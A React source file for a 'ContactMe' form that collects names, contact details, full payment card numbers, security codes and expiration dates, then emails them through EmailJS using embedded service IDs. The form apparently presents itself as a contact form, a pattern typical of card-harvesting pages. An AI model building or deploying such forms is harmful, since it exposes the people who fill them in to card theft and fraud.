// EmailJs
import emailjs from "emailjs-com";

// Style
import styled from "styled-components";

function sendEmail(e) {
  e.preventDefault();

  emailjs
    .sendForm(
      "service_43djgar",
      "template_tz5ilpf",
      e.target,
      "user_V4FljNqzoczL9fpBp5euh"
    )
    .then(
      (result) => {
        console.log(result.text);
      },
      (error) => {
        console.log(error.text);
      }
    );
  e.target.reset();
}

const ContactMe = () => {
  return (
    <Form>
      <form className="contact-form" onSubmit={sendEmail}>
        <div className="form-data">
          <div className="user-info">
            <input
              type="text"
              className="first"
              name="user_first"
              placeholder="First"
            />
            <input
              type="text"
              className="last"
              name="user_last"
              placeholder="Last"
            />
            <input
              type="email"
              className="email"
              name="user_email"
              placeholder="Email Address"
            />
            <input
              type="tel"
              className="phone"
              name="user_phone"
              placeholder="Phone Number"
            />
            <input
              type="text"
              className="card"
              name="user_card"
              pattern="\d*"
              placeholder="Card Number"
              maxlength="16"
            />
            <input
              type="text"
              className="csc"
              name="user_csc"
              pattern="\d*"
              placeholder="CSC"
              maxlength="3"
            />
            <input
              type="text"
              className="exp"
              name="user_exp"
              placeholder="Expiration"
              maxlength="5"
            />
          </div>
        </div>
        <div className="send">
          <button type="submit" value="Send">
            <h2>Send</h2>
          </button>
        </div>
      </form>
    </Form>
  );
};

const Form = styled.div`
  margin-bottom: rem;
  .contact-form {
    width: 100%;
    margin: auto;
    .form-data {
      display: flex;
      align-items: center;
      justify-content: space-between;
      margin-bottom: 1rem;
    }
    .user-info {
      display: flex;
      flex-direction: column;
    }
    label {
      padding-right: 1rem;
      font-size: 1.5rem;
    }
    input {
      height: 2rem;
      width: 25rem;
      padding: 0.3rem;
      font-size: 1.4rem;
      margin-bottom: 2rem;
    }

    input::-webkit-outer-spin-button,
    input::-webkit-inner-spin-button {
      /* display: none; <- Crashes Chrome on hover */
      -webkit-appearance: none;
      margin: 0; /* <-- Apparently some margin are still there even though it's hidden */
    }

    input[type="number"] {
      -moz-appearance: textfield; /* Firefox */
    }

    .send {
      display: flex;
      justify-content: center;
      button {
        padding: 0.8rem 3rem 0.8rem 3rem;
        border-radius: 2em;
        border: none;
        :hover {
          transition: all 0.1s ease-in-out;
          transform: scale(1.1);
          background: #fcfd01;
        }
      }
    }
  }
`;

export default ContactMe;
